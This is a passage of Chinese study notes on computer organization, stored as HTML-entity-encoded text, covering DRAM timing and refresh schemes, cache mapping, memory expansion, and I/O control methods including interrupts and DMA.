&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;RAS&#xAF;&#x7684;&#x65F6;&#x95F4;&#x5FC5;&#x987B;&#x8981;&#x8D85;&#x8FC7;&#x5176;&#x89C4;&#x5B9A;&#x503C;</p><p>RAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;RAS&#xAF;&#x548C;CAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;CAS&#xAF;&#x6B63;&#x3001;&#x8D1F;&#x7535;&#x5E73;&#x7684;&#x5BBD;&#x5EA6;&#x8981;&#x5927;&#x4E8E;&#x89C4;&#x5B9A;&#x503C;&#xFF0C;&#x4EE5;&#x4FDD;&#x8BC1;&#x82AF;&#x7247;&#x5185;&#x90E8;&#x6B63;&#x5E38;&#x5DE5;&#x4F5C;</p><p>&#x884C;&#x5730;&#x5740;&#x5BF9;RAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;RAS&#xAF;&#x7684;&#x4E0B;&#x964D;&#x6CBF;&#x4EE5;&#x53CA;&#x5217;&#x5730;&#x5740;&#x5BF9;CAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;CAS&#xAF;&#x7684;&#x4E0B;&#x964D;&#x6CBF;&#x5E94;&#x6709;&#x8DB3;&#x591F;&#x7684;&#x5730;&#x5740;&#x5EFA;&#x7ACB;&#x65F6;&#x95F4;&#x548C;&#x5730;&#x5740;&#x4FDD;&#x6301;&#x65F6;&#x95F4;&#xFF0C;&#x5DF2;&#x786E;&#x5B9A;&#x884C;&#x3001;&#x5217;&#x5730;&#x5740;&#x5747;&#x80FD;&#x51C6;&#x786E;&#x5199;&#x5165;&#x82AF;&#x7247;&#x3002;</p><p>&#x52A8;&#x6001;RAM&#x8BFB;&#x65F6;&#x5E8F;<br>&#x884C;&#x5730;RAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;RAS&#xAF;&#x6709;&#x6548;<br>&#x5199;&#x5141;&#x8BB8;WE&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;WE&#xAF;&#x6709;&#x6548;&#xFF08;&#x9AD8;&#xFF09;<br>&#x5217;&#x5730;&#x5740;CAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;CAS&#xAF;&#x6709;&#x6548;<br>&#x6570;&#x636E;DOUTDOUT&#x6709;&#x6548;</p><p>&#x52A8;&#x6001;RAM&#x5199;&#x65F6;&#x5E8F;<br>&#x884C;&#x5730;&#x5740;RAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;RAS&#xAF;&#x6709;&#x6548;<br>&#x5199;&#x5141;&#x8BB8;WE&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;WE&#xAF;&#x6709;&#x6548;&#xFF08;&#x4F4E;&#xFF09;<br>&#x6570;&#x636E;DINDIN&#x6709;<br>&#x5217;&#x5730;&#x5740;CAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;CAS&#xAF;&#x6709;&#x6548;</p><p>&#x52A8;&#x6001;RAM&#x5237;&#x65B0;<br>&#x5237;&#x65B0;&#x5B9E;&#x8D28;&#x662F;&#x5C06;&#x539F;&#x4FE1;&#x606F;&#x8BFB;&#x51FA;&#xFF0C;&#x5728;&#x7531;&#x5237;&#x65B0;&#x653E;&#x5927;&#x5668;&#x5F62;&#x6210;&#x539F;&#x4FE1;&#x606F;&#x5E76;&#x91CD;&#x65B0;&#x5199;&#x5165;&#x7684;&#x518D;&#x751F;&#x8FC7;&#x7A0B;</p><p>&#x96C6;&#x4E2D;&#x5237;&#x65B0;&#x2013;&#x5728;&#x89C4;&#x5B9A;&#x7684;&#x4E00;&#x4E2A;&#x5237;&#x65B0;&#x5468;&#x671F;&#x5185;&#xFF0C;&#x5BF9;&#x5168;&#x90E8;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x96C6;&#x4E2D;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x9010;&#x884C;&#x8FDB;&#x884C;&#x5237;&#x65B0;&#xFF0C;&#x6B64;&#x523B;&#x5FC5;&#x987B;&#x505C;&#x6B62;&#x8BFB;/&#x5199;&#x64CD;&#x4F5C;&#x3002;&#x4E4B;&#x540E;&#x5269;&#x4F59;&#x7684;&#x65F6;&#x95F4;&#x8FDB;&#x884C;&#x8BFB;&#x5199;&#x64CD;&#x4F5C;&#x6216;&#x7EF4;&#x6301;&#x4FE1;&#x606F;&#x3002;&#x56E0;&#x6B64;&#x5B58;&#x5728;&#x201C;&#x6B7B;&#x65F6;&#x95F4;&#x201D;&#x6216;&#x8BBF;&#x5B58;&#x201C;&#x6B7B;&#x533A;&#x201D;&#x3002;</p><p>&#x5206;&#x6563;&#x5237;&#x65B0;&#x2013;&#x5BF9;&#x6BCF;&#x884C;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x7684;&#x5237;&#x65B0;&#x5206;&#x6563;&#x5230;&#x6BCF;&#x4E2A;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x5185;&#x5B8C;&#x6210;&#x3002;&#x5176;&#x4E2D;&#x628A;&#x673A;&#x5668;&#x7684;&#x5468;&#x671F;tctc&#x5206;&#x6210;&#x4E24;&#x6BB5;&#xFF0C;&#x524D;&#x534A;&#x6BB5;tMtM&#x7528;&#x6765;&#x8BFB;&#x5199;&#x6216;&#x7EF4;&#x6301;&#x4FE1;&#x606F;&#xFF0C;&#x540E;&#x534A;&#x6BB5;tRtR&#x7528;&#x6765;&#x5237;&#x65B0;,&#x4E0D;&#x5B58;&#x5728;&#x6B7B;&#x65F6;&#x95F4;&#xFF0C;&#x4F46;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x957F;</p><p>&#x5F02;&#x6B65;&#x5237;&#x65B0;&#x2013;&#x5F02;&#x6B65;&#x5237;&#x65B0;&#x4E3A;&#x524D;&#x4E24;&#x79CD;&#x7684;&#x7ED3;&#x5408;&#xFF0C;&#x65E2;&#x53EF;&#x4EE5;&#x7F29;&#x77ED;&#x6B7B;&#x65F6;&#x95F4;&#xFF0C;&#x53C8;&#x53EF;&#x4EE5;&#x5145;&#x5206;&#x5229;&#x7528;2ms&#x7684;&#x7279;&#x70B9;</p><p>&#x52A8;&#x6001;RAM&#x548C;&#x9759;&#x6001;RAM&#x7684;&#x6BD4;&#x8F83;</p><p>&#x5728;&#x540C;&#x6837;&#x5927;&#x5C0F;&#x7684;&#x82AF;&#x7247;&#x4E2D;&#xFF0C;&#x52A8;&#x6001;RAM&#x7684;&#x96C6;&#x6210;&#x5EA6;&#x8FDC;&#x9AD8;&#x4E8E;&#x9759;&#x6001;RAM&#x3002;</p><p>&#x52A8;&#x6001;RAM&#x884C;&#x3001;&#x5217;&#x5730;&#x5740;&#x6309;&#x5148;&#x540E;&#x987A;&#x5E8F;&#x8F93;&#x9001;&#xFF0C;&#x51CF;&#x5C11;&#x4E86;&#x82AF;&#x7247;&#x7684;&#x5F15;&#x811A;&#xFF0C;&#x5C01;&#x88C5;&#x5C3A;&#x5BF8;&#x4E5F;&#x51CF;&#x5C11;</p><p>&#x52A8;&#x6001;RAM&#x7684;&#x529F;&#x8017;&#x6BD4;&#x9759;&#x6001;RAM&#x5C0F;</p><p>&#x52A8;&#x6001;RAM&#x7684;&#x4EF7;&#x683C;&#x6BD4;&#x9759;&#x6001;RAM&#x7684;&#x4EF7;&#x683C;&#x4FBF;&#x5B9C;</p><p>&#x7531;&#x4E8E;&#x4F7F;&#x7528;&#x52A8;&#x6001;&#x5143;&#x4EF6;(&#x7535;&#x5BB9;)&#xFF0C;&#x56E0;&#x6B64;&#x5B83;&#x7684;&#x901F;&#x5EA6;&#x6BD4;&#x9759;&#x6001;RAM&#x4F4E;</p><p>&#x52A8;&#x6001;RAM&#x9700;&#x8981;&#x518D;&#x751F;&#xFF0C;&#x6545;&#x9700;&#x8981;&#x914D;&#x7F6E;&#x518D;&#x751F;&#x7535;&#x8DEF;&#xFF0C;&#x4E5F;&#x9700;&#x8981;&#x6D88;&#x8017;&#x4E00;&#x90E8;&#x5206;&#x529F;&#x7387;&#x3002;&#x901A;&#x5E38;&#xFF0C;&#x5BB9;&#x91CF;&#x4E0D;&#x5927;&#x7684;&#x9AD8;&#x901F;&#x7F13;&#x5B58;&#x5668;&#x5927;&#x591A;&#x7528;&#x9759;&#x6001;RAM&#x5B9E;&#x73B0;</p><p>&#x5B58;&#x50A8;&#x5668;&#x4E0E;CPU&#x7684;&#x8FDE;&#x63A5;</p><p>&#x5B58;&#x50A8;&#x5BB9;&#x91CF;&#x7684;&#x6269;&#x5C55;</p><p>&#x4F4D;&#x6269;&#x5C55;&#x2013;&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x5B57;&#x957F;</p><p>&#x5B57;&#x6269;&#x5C55;&#x2013;&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x5668;&#x5B57;&#x7684;&#x6570;&#x91CF;</p><p>&#x5B57;&#x3001;&#x4F4D;&#x6269;&#x5C55;&#x2013;&#x65E2;&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x5B57;&#x7684;&#x6570;&#x91CF;&#xFF0C;&#x53C8;&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x5B57;&#x957F;</p><p>&#x5B58;&#x50A8;&#x5668;&#x4E0E;CPU&#x8FDE;&#x63A5;</p><p>&#x5730;&#x5740;&#x7EBF;&#x7684;&#x8FDE;&#x63A5;&#x2013;CPU&#x7684;&#x5730;&#x5740;&#x7EBF;&#x5F80;&#x5F80;&#x6BD4;&#x5B58;&#x50A8;&#x82AF;&#x7247;&#x7684;&#x5730;&#x5740;&#x7EBF;&#x6570;&#x591A;&#xFF0C;&#x901A;&#x5E38;&#x603B;&#x662F;&#x5C06;CPU&#x5730;&#x5740;&#x7EBF;&#x7684;&#x4F4E;&#x4F4D;&#x4E0E;&#x5B58;&#x50A8;&#x5668;&#x7684;&#x82AF;&#x7247;&#x7684;&#x5730;&#x5740;&#x7EBF;&#x76F8;&#x8FDE;&#xFF0C;CPU&#x5730;&#x5740;&#x7EBF;&#x7684;&#x9AD8;&#x4F4D;&#x6216;&#x5728;&#x5B58;&#x50A8;&#x82AF;&#x7247;&#x7684;&#x6269;&#x5145;&#x65F6;&#x7528;&#xFF0C;&#x6216;&#x4F5C;&#x5176;&#x4ED6;&#x7528;&#x9014;&#x3002;</p><p>&#x6570;&#x636E;&#x7EBF;&#x7684;&#x8FDE;&#x63A5;&#x2013;CPU&#x7684;&#x6570;&#x636E;&#x7EBF;&#x4E0E;&#x5B58;&#x50A8;&#x5668;&#x7684;&#x4E5F;&#x4E0D;&#x7B49;&#xFF0C;&#x56E0;&#x6B64;&#x5FC5;&#x987B;&#x5BF9;&#x5B58;&#x50A8;&#x82AF;&#x7247;&#x6269;&#x4F4D;&#x4F7F;&#x5176;&#x76F8;&#x7B49;</p><p>&#x7247;&#x9009;&#x7EBF;&#x7684;&#x8FDE;&#x63A5;&#x2013;&#x662F;CPU&#x4E0E;&#x5B58;&#x50A8;&#x82AF;&#x7247;&#x6B63;&#x786E;&#x5DE5;&#x4F5C;&#x7684;&#x5173;&#x952E;</p><p>&#x5408;&#x7406;&#x9009;&#x62E9;&#x5B58;&#x50A8;&#x82AF;&#x7247;&#x2013;&#x6307;&#x5B58;&#x50A8;&#x82AF;&#x7247;&#x7C7B;&#x578B;(RAM&#x6216;ROM)&#x548C;&#x6570;&#x91CF;&#x7684;&#x9009;&#x62E9;&#x3002;&#x901A;&#x5E38;&#x7528;ROM&#x5B58;&#x653E;&#x7A0B;&#x5E8F;&#xFF0C;&#x6807;&#x51C6;&#x5B50;&#x7A0B;&#x5E8F;&#x548C;&#x5404;&#x7C7B;&#x5E38;&#x6570;&#x7B49;&#x3002;RAM&#x4E3A;&#x7528;&#x6237;&#x7F16;&#x7A0B;&#x8BBE;&#x8BA1;&#x3002;&#x6B64;&#x5916;&#xFF0C;&#x5C3D;&#x91CF;&#x9009;&#x62E9;&#x8FDE;&#x7EBF;&#x7B80;&#x5355;&#x65B9;&#x4FBF;&#x3002;</p><p>&#x63D0;&#x9AD8;&#x8BBF;&#x5B58;&#x901F;&#x5EA6;&#x7684;&#x63AA;&#x65BD;</p><p>&#x5355;&#x4F53;&#x591A;&#x5B57;&#x7CFB;&#x7EDF;&#x2013;&#x5728;&#x4E00;&#x4E2A;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x5185;&#xFF0C;&#x4ECE;&#x540C;&#x4E00;&#x5730;&#x5740;&#x53D6;&#x51FA;4&#x6761;&#x6307;&#x4EE4;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x9010;&#x6761;&#x9001;&#x81F3;CPU&#x6267;&#x884C;&#x3002;&#x589E;&#x5927;&#x5B58;&#x50A8;&#x5668;&#x5E26;&#x5BBD;&#xFF0C;&#x63D0;&#x9AD8;&#x5B58;&#x50A8;&#x5668;&#x5DE5;&#x4F5C;&#x901F;&#x5EA6;&#x3002;&#x524D;&#x63D0;&#x662F;&#xFF0C;&#x6307;&#x4EE4;&#x548C;&#x6570;&#x636E;&#x5728;&#x4E3B;&#x5B58;&#x5185;&#x5FC5;&#x987B;&#x662F;&#x8FDE;&#x7EED;&#x5B58;&#x653E;&#x3002;</p><p>&#x591A;&#x4F53;&#x5E76;&#x884C;&#x7CFB;&#x7EDF;&#x2013;&#x91C7;&#x7528;&#x591A;&#x63D0;&#x6A21;&#x5757;&#x7EC4;&#x6210;&#x7684;&#x5B58;&#x50A8;&#x5668;&#xFF0C;&#x6BCF;&#x4E2A;&#x6A21;&#x5757;&#x5177;&#x6709;&#x76F8;&#x540C;&#x7684;&#x5BB9;&#x91CF;&#x548C;&#x5B58;&#x53D6;&#x901F;&#x5EA6;&#xFF0C;&#x5404;&#x81EA;&#x5177;&#x6709;&#x72EC;&#x7ACB;&#x7684;&#x5BC4;&#x5B58;&#x5668;(MAR)&#xFF0C;&#x6570;&#x636E;&#x5BC4;&#x5B58;&#x5668;(MDR)&#xFF0C;&#x5730;&#x5740;&#x8BD1;&#x7801;&#xFF0C;&#x9A71;&#x52A8;&#x7535;&#x8DEF;&#x548C;&#x8BFB;&#x5199;&#x7535;&#x8DEF;&#x3002;</p><p>&#x9AD8;&#x4F4D;&#x4EA4;&#x53C9;&#x7F16;&#x5740;&#x7684;&#x591A;&#x4F53;&#x5B58;&#x50A8;&#x5668;</p><p>&#x4F4E;&#x4F4D;&#x4EA4;&#x53C9;&#x7F16;&#x5740;&#x7684;&#x591A;&#x4F53;&#x5B58;&#x50A8;&#x5668;</p><p>&#x9AD8;&#x901F;&#x7F13;&#x51B2;&#x5B58;&#x50A8;&#x5668;</p><p>Cache&#x7684;&#x57FA;&#x672C;&#x7ED3;&#x6784;</p><p>&#x5730;&#x5740;&#x6620;&#x5C04;&#x53D8;&#x6362;&#x673A;&#x6784;&#x2013;&#x5C06;CPU&#x9001;&#x6765;&#x7684;&#x4E3B;&#x5B58;&#x5730;&#x5740;&#x8F6C;&#x6362;&#x4E3A;Cache&#x5730;&#x5740;&#x3002;</p><p>Cache&#x2013;&#x4E3B;&#x5B58;&#x5730;&#x5740;&#x6620;&#x5C04;</p><p>&#x76F4;&#x63A5;&#x6620;&#x5C04;</p><p>&#x4F18;&#x70B9;&#xFF1A;&#x5B9E;&#x73B0;&#x7B80;&#x5355;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x5229;&#x7528;&#x4E3B;&#x5B58;&#x5730;&#x5740;&#x7684;&#x67D0;&#x4E9B;&#x4F4D;&#x76F4;&#x63A5;&#x5224;&#x65AD;&#xFF0C;&#x5373;&#x53EF;&#x786E;&#x5B9A;&#x6240;&#x9700;&#x5B57;&#x5757;&#x662F;&#x5426;&#x5728;&#x7F13;&#x5B58;&#x4E2D;</p><p>&#x7F3A;&#x70B9;&#xFF1A;&#x4E0D;&#x591F;&#x7075;&#x6D3B;&#xFF0C;&#x6BCF;&#x4E2A;&#x4E3B;&#x5B58;&#x5FEB;&#x53EA;&#x80FD;&#x56FA;&#x5B9A;&#x7684;&#x5BF9;&#x5E94;&#x67D0;&#x4E2A;&#x7F13;&#x5B58;&#x5757;&#xFF0C;&#x5373;&#x4F7F;&#x7F13;&#x5B58;&#x5185;&#x8FD8;&#x7A7A;&#x7740;&#x8BB8;&#x591A;&#x4F4D;&#x7F6E;&#x4E5F;&#x4E0D;&#x80FD;&#x88AB;&#x5360;&#x7528;&#xFF0C;&#x4F7F;&#x7F13;&#x5B58;&#x7684;&#x7A7A;&#x95F4;&#x5F97;&#x4E0D;&#x5230;&#x5145;&#x5206;&#x7684;&#x5229;&#x7528;&#x3002;&#x6B64;&#x5916;&#xFF0C;&#x5982;&#x679C;&#x7A0B;&#x5E8F;&#x6070;&#x597D;&#x91CD;&#x590D;&#x8BBF;&#x95EE;&#x5BF9;&#x5E94;&#x540C;&#x4E00;&#x7F13;&#x5B58;&#x4F4D;&#x7F6E;&#x4E0D;&#x540C;&#x7684;&#x4E3B;&#x5B58;&#x5757;&#xFF0C;&#x5C31;&#x8981;&#x4E0D;&#x505C;&#x7684;&#x8FDB;&#x884C;&#x66FF;&#x6362;&#xFF0C;&#x964D;&#x4F4E;&#x547D;&#x4E2D;&#x7387;&#x3002;</p><p>&#x5168;&#x76F8;&#x8054;&#x6620;&#x5C04;&#x2013;&#x5141;&#x8BB8;&#x4E3B;&#x5B58;&#x4E2D;&#x6BCF;&#x4E00;&#x5B57;&#x5757;&#x6620;&#x5C04;&#x5230;Cache&#x4E2D;&#x7684;&#x4EFB;&#x4F55;&#x4E00;&#x5757;&#x4F4D;&#x7F6E;&#x4E0A;&#x3002;</p><p>&#x4F18;&#x70B9;&#xFF1A;&#x7075;&#x6D3B;&#xFF0C;&#x547D;&#x4E2D;&#x7387;&#x9AD8;&#xFF0C;&#x7F29;&#x5C0F;&#x4E86;&#x5FEB;&#x51B2;&#x7A81;&#x7387;&#x3002;</p><p>&#x7F3A;&#x70B9;&#xFF1A;&#x6240;&#x9700;&#x7684;&#x903B;&#x8F91;&#x7535;&#x8DEF;&#x751A;&#x591A;&#xFF0C;&#x6210;&#x672C;&#x8F83;&#x9AD8;&#x3002;</p><p>&#x7EC4;&#x76F8;&#x8054;&#x6620;&#x5C04;</p><p>&#x4E94;  &#x8F93;&#x5165;&#x8F93;&#x51FA;&#x7CFB;&#x7EDF;</p><p>&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x7CFB;&#x7EDF;&#x53D1;&#x5C55;&#x7684;&#x56DB;&#x4E2A;&#x9636;&#x6BB5;</p><ol><li>&#x65E9;&#x671F;&#x9636;&#x6BB5;</li></ol><p>&#x5206;&#x6563;&#x8FDE;&#x63A5; CPU&#x548C;I/O&#x8BBE;&#x5907; &#x4E32;&#x884C;&#x5DE5;&#x4F5C; &#x7A0B;&#x5E8F;&#x67E5;&#x8BE2;&#x65B9;&#x5F0F;</p><ol start="2"><li>&#x63A5;&#x53E3;&#x6A21;&#x5757;&#x548C;DMA&#x9636;&#x6BB5;</li></ol><p>&#x603B;&#x7EBF;&#x8FDE;&#x63A5; CPU&#x548C;I/O&#x8BBE;&#x5907;&#x5E76;&#x884C;&#x5DE5;&#x4F5C;</p><ol start="3"><li><p>&#x5177;&#x6709;&#x901A;&#x9053;&#x7ED3;&#x6784;&#x7684;&#x9636;&#x6BB5;</p></li><li><p>&#x5177;&#x6709;I/O&#x5904;&#x7406;&#x673A;&#x7684;&#x9636;&#x6BB5;</p></li></ol><p>&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x7CFB;&#x7EDF;&#x7684;&#x7EC4;&#x6210;</p><p>1.I/O&#x8F6F;&#x4EF6;</p><p>I/O&#x6307;&#x4EE4; CPU&#x6307;&#x4EE4;&#x7684;&#x4E00;&#x90E8;&#x5206;</p><p>| &#x64CD;&#x4F5C;&#x7801; | &#x547D;&#x4EE4;&#x7801; | &#x8BBE;&#x5907;&#x7801; |</p><p>&#x901A;&#x9053;&#x6307;&#x4EE4;&#xFF1A;&#x901A;&#x9053;&#x81EA;&#x8EAB;&#x7684;&#x6307;&#x4EE4; &#x6307;&#x660E;&#x6570;&#x7EC4;&#x7684;&#x9996;&#x5730;&#x5740;&#x3001;&#x4F20;&#x9001;&#x5B57;&#x6570;&#x3001;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;&#x3002;</p><p>I/O&#x786C;&#x4EF6;</p><p>&#x8BBE;&#x5907; I/O&#x63A5;&#x53E3;</p><p>&#x8BBE;&#x5907; &#x8BBE;&#x5907;&#x63A7;&#x5236;&#x5668; &#x901A;&#x9053;</p><p>I/O&#x8BBE;&#x5907;&#x4E0E;&#x4E3B;&#x673A;&#x7684;&#x8054;&#x7CFB;&#x65B9;&#x5F0F;</p><ol><li>I/O&#x8BBE;&#x5907;&#x7F16;&#x5740;&#x65B9;&#x5F0F;</li></ol><p>&#x7EDF;&#x4E00;&#x7F16;&#x5740; &#x7528;&#x53D6;&#x6570;&#x5B58;&#x6570;&#x6307;&#x4EE4;</p><p>&#x4E0D;&#x7EDF;&#x4E00;&#x7F16;&#x5740; &#x6709;&#x4E13;&#x95E8;&#x7684;I/O&#x6307;&#x4EE4;</p><ol start="2"><li>&#x8BBE;&#x5907;&#x5BFB;&#x5740;</li></ol><p>&#x7528;&#x8BBE;&#x5907;&#x9009;&#x62E9;&#x7535;&#x8DEF;&#x8BC6;&#x522B;&#x662F;&#x5426;&#x88AB;&#x9009;&#x4E2D;</p><ol start="3"><li>&#x4F20;&#x9001;&#x65B9;&#x5F0F;</li></ol><p>&#x4E32;&#x884C; &#x5E76;&#x884C;</p><ol start="4"><li>&#x8054;&#x7EDC;&#x65B9;&#x5F0F;</li></ol><p>&#x7ACB;&#x5373;&#x54CD;&#x5E94;&#x65B9;&#x5F0F;</p><p>&#x5F02;&#x6B65;&#x65B9;&#x5F0F;&#x91C7;&#x7528;&#x5E94;&#x7B54;&#x4FE1;&#x53F7;</p><p>&#x540C;&#x6B65;&#x5DE5;&#x4F5C;&#x91C7;&#x7528;&#x540C;&#x6B65;&#x65F6;&#x6807;&#x8054;&#x7EDC;</p><ol start="5"><li>I/O&#x8BBE;&#x5907;</li></ol><p>&#x8F90;&#x5C04;&#x5F0F;&#x8FDE;&#x63A5;</p><p>&#x603B;&#x7EBF;&#x5F0F;&#x8FDE;&#x63A5;</p><p>I/O&#x8BBE;&#x5907;&#x4E0E;&#x4E3B;&#x673A;&#x4FE1;&#x606F;&#x4F20;&#x9001;&#x7684;&#x63A7;&#x5236;&#x65B9;&#x5F0F;</p><ol><li>&#x7A0B;&#x5E8F;&#x67E5;&#x8BE2;&#x65B9;&#x5F0F;</li></ol><ol start="2"><li>&#x7A0B;&#x5E8F;&#x4E2D;&#x65AD;&#x65B9;&#x5F0F;</li></ol><p>&#x5018;&#x82E5;CPU&#x5728;&#x542F;&#x52A8;I/O&#x8BBE;&#x5907;&#x540E;&#xFF0C;&#x4E0D;&#x67E5;&#x8BE2;&#x8BBE;&#x5907;&#x662F;&#x5426;&#x5DF2;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#xFF0C;&#x7EE7;&#x7EED;&#x6267;&#x884C;&#x81EA;&#x8EAB;&#x7A0B;&#x5E8F;&#xFF0C;&#x53EA;&#x662F;&#x5F53;I/O&#x8BBE;&#x5907;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#x5E76;&#x5411;CPU&#x53D1;&#x51FA;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x540E;&#x624D;&#x4E88;&#x4EE5;&#x54CD;&#x5E94;&#x3002;</p><ol start="3"><li>DMA&#x65B9;&#x5F0F;(&#x76F4;&#x63A5;&#x5B58;&#x50A8;&#x5668;&#x5B58;&#x53D6;)</li></ol><p>&#x4E3B;&#x5B58;&#x4E0E;I/O&#x8BBE;&#x5907;&#x4E4B;&#x95F4;&#x6709;&#x4E00;&#x6761;&#x6570;&#x636E;&#x901A;&#x8DEF;&#xFF0C;&#x4E3B;&#x5B58;&#x4E0E;I/O&#x8BBE;&#x5907;&#x4EA4;&#x6362;&#x4FE1;&#x606F;&#x65F6;&#xFF0C;&#x65E0;&#x987B;&#x8C03;&#x7528;&#x4E2D;&#x65AD;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x3002;&#x82E5;&#x51FA;&#x73B0;DMA&#x548C;CPU&#x540C;&#x65F6;&#x8BBF;&#x95EE;&#x4E3B;&#x5B58;&#xFF0C;CPU&#x603B;&#x662F;&#x5C06;&#x603B;&#x7EBF;&#x5360;&#x6709;&#x6743;&#x8BA9;&#x7ED9;DMA&#xFF0C;&#x901A;&#x5E38;&#x628A;DMA&#x8FD9;&#x79CD;&#x5360;&#x6709;&#x79F0;&#x4E3A;&#x7A83;&#x53D6;&#x6216;&#x632A;&#x7528;&#x3002;&#x7A83;&#x53D6;&#x7684;&#x65F6;&#x95F4;&#x4E00;&#x822C;&#x4E3A;&#x4E00;&#x4E2A;&#x5468;&#x671F;&#xFF0C;&#x6545;&#x53C8;&#x628A;DMA&#x5360;&#x7528;&#x7684;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x7A83;&#x53D6;&#x5468;&#x671F;&#x6216;&#x632A;&#x7528;&#x5468;&#x671F;&#x3002;</p><p>I/O&#x63A5;&#x53E3;</p><p>&#x4E3A;&#x4EC0;&#x4E48;&#x8BBE;&#x7F6E;I/O&#x63A5;&#x53E3;</p><p>&#x5B9E;&#x73B0;&#x8BBE;&#x5907;&#x7684;&#x9009;&#x62E9;</p><p>&#x5B9E;&#x73B0;&#x6570;&#x636E;&#x7F13;&#x51B2;&#x8FBE;&#x5230;&#x901F;&#x5EA6;&#x5339;&#x914D;</p><p>&#x5B9E;&#x73B0;&#x6570;&#x636E;&#x4E32;&#x2013;&#x5E76;&#x683C;&#x5F0F;&#x8F6C;&#x6362;</p><p>&#x5B9E;&#x73B0;&#x7535;&#x5E73;&#x8F6C;&#x6362;</p><p>&#x5B9E;&#x73B0;&#x7535;&#x5E73;&#x8F6C;&#x6362;</p><p>&#x4F20;&#x9001;&#x63A7;&#x5236;&#x547D;&#x4EE4;</p><p>&#x53CD;&#x6620;&#x8BBE;&#x5907;&#x7684;&#x72B6;&#x6001;(&#x201C;&#x5FD9;&#x201D;,&#x201D;&#x5C31;&#x7EEA;&#x201D;,&#x201D;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x201D;)</p><p>&#x7AEF;&#x53E3;&#x548C;&#x63A5;&#x53E3;&#x7684;&#x5173;&#x7CFB;</p><p>&#x7AEF;&#x53E3;&#x662F;&#x6307;&#x63A5;&#x53E3;&#x7535;&#x8DEF;&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x8FD9;&#x4E9B;&#x5BC4;&#x5B58;&#x5668;&#x7528;&#x6765;&#x5B58;&#x653E;&#x6570;&#x636E;&#x4FE1;&#x606F;&#xFF0C;&#x63A7;&#x5236;&#x4FE1;&#x606F;&#x548C;&#x72B6;&#x6001;&#x4FE1;&#x606F;&#xFF0C;&#x76F8;&#x5E94;&#x7684;&#x7AEF;&#x53E3;&#x88AB;&#x5206;&#x522B;&#x79F0;&#x4E3A;&#x6570;&#x636E;&#x7AEF;&#x53E3;&#xFF0C;&#x63A7;&#x5236;&#x7AEF;&#x53E3;&#xFF0C;&#x548C;&#x72B6;&#x6001;&#x7AEF;&#x53E3;&#x3002;&#x82E5;&#x5E72;&#x4E2A;&#x7AEF;&#x53E3;&#x52A0;&#x4E0A;&#x76F8;&#x5E94;&#x7684;&#x63A7;&#x5236;&#x903B;&#x8F91;&#x624D;&#x80FD;&#x7EC4;&#x6210;&#x63A5;&#x53E3;&#x3002;</p><p>&#x63A5;&#x53E3;&#x7684;&#x529F;&#x80FD;&#x548C;&#x7EC4;&#x6210;</p><p>&#x603B;&#x7EBF;&#x8FDE;&#x63A5;&#x65B9;&#x5F0F;&#x7684;I/O&#x63A5;&#x53E3;&#x7535;&#x8DEF;</p><p>&#x8BBE;&#x5907;&#x9009;&#x62E9;&#x7EBF;&#xFF0C;&#x6570;&#x636E;&#x7EBF;&#xFF0C;&#x547D;&#x4EE4;&#x7EBF;&#xFF0C;&#x72B6;&#x6001;&#x7EBF;</p><p>&#x63A5;&#x53E3;&#x7684;&#x529F;&#x80FD;&#x548C;&#x7EC4;&#x6210;</p><table><thead><tr><th>&#x63A5;&#x53E3;&#x529F;&#x80FD;</th><th>&#x63A5;&#x53E3;&#x7EC4;&#x6210;</th></tr></thead><tbody><tr><td>&#x9009;&#x5740;&#x529F;&#x80FD;</td><td>&#x8BBE;&#x5907;&#x9009;&#x62E9;&#x7535;&#x8DEF;</td></tr><tr><td>&#x4F20;&#x9001;&#x547D;&#x4EE4;&#x7684;&#x529F;&#x80FD;</td><td>&#x547D;&#x4EE4;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x547D;&#x4EE4;&#x8BD1;&#x7801;&#x5668;</td></tr><tr><td>&#x4F20;&#x9001;&#x6570;&#x636E;&#x7684;&#x529F;&#x80FD;</td><td>&#x6570;&#x636E;&#x7F13;&#x51B2;&#x5BC4;&#